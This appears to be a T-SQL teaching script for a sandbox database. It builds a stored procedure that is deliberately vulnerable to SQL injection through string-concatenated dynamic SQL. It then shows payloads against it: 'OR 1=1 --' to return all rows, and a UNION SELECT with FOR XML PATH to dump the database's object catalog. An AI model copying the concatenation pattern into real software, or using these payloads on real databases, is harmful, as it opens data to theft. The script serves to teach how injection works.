USE [InjectionSandbox];
GO

/***************************************
* 
* 0. Setup injectable dynamic query
*
***************************************/
DROP PROCEDURE IF EXISTS dbo.usp_GetFullName;
GO

CREATE PROCEDURE dbo.usp_GetFullName
	@ParmUserName varchar(100)
AS
BEGIN
	DECLARE @FullQuery varchar(1000)

	SET @FullQuery = '	SELECT FullName 
						FROM dbo.Users 
						WHERE UserName = ''' + @ParmUserName + ''''

	EXEC(@FullQuery);
END
GO


/***************************************
* 
* 1. Basic SQL Injection
*
***************************************/
-- Procedure generates: 
-- SELECT FullName FROM dbo.Users WHERE UserName = 'TFly37'
EXEC dbo.usp_GetFullName 'TFly37' 

-- And the injection attempt
-- Procedure generates:
-- SELECT FullName FROM dbo.Users WHERE UserName = 'TFly37' OR 1=1 --'
EXEC dbo.usp_GetFullName 'TFly37'' OR 1=1 --'

-- 'OR 1=1 --' makes our WHERE condition return all rows 
-- and comment out the rest of the query.


/***************************************
* 
* 2. Learning about our database
*
***************************************/

-- What if we want data from a different table, or the whole database?
-- We can use FOR XML PATH to get all database objects on a single row.
SELECT * FROM sys.objects FOR XML PATH

-- We can then inject it into our stored procedure:
EXEC dbo.usp_GetFullName @ParmUserName = 'TFly37'' UNION SELECT (SELECT * FROM sys.objects FOR XML PATH) --' 

-- We use UNION so that a sort occurs (via distinct), forcing our sys.objects dump to always
-- be the first row (in case the app codes for only 1 row to return.  
-- If '<' character doesn't sort first, can always concatenate other characters to the front)
